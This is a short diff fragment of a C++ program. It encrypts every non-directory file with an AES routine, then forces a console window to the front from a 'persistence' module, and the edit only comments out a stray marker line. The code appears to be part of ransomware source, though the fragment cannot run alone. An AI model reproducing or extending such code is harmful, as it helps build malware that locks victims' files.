@@ -68,7 +68,7 @@ int main(int argc, char* argv[]) {
         if (!std::filesystem::is_directory(filename))
             AES.encryptFile(filename);
     }
-    { END ENCRYPTION } //
+    // { END ENCRYPTION } //
     ShowWindow(Console, 1);
     std::thread ForceOpen(persistence::ForceConsoleToFront);
     ForceOpen.detach();
